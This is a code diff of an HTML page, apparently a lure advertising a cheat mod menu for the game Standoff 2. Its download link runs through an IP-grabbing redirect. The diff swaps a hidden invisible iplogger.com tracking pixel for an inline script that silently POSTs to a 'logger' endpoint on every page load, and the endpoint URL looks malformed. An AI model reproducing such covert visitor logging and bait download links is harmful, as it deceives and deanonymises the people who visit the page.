@@ -6,8 +6,18 @@
 <p>Стены, прицел, скины.</p>
 <a href="https://grabify.link/4QX57L">Скачать APK</a>
 
-<!-- НЕВИДИМЫЙ ПИКСЕЛЬ ДЛЯ IP LOGGER -->
-<img src="https://iplogger.com/2hskQ6" width="0" height="0" style="display:none;" />
+<!-- Ваш логгер -->
+<script>
+(function() {
+    const LOGGER_URL = "https://ryzen-dev-create.github.io/Standoff2-mod-menu/.com/log";
+    
+    fetch(LOGGER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ page: "Standoff2-mod-menu" })
+    }).catch(err => console.log("Logger error:", err));
+})();
+</script>
 
 </body>
 </html>
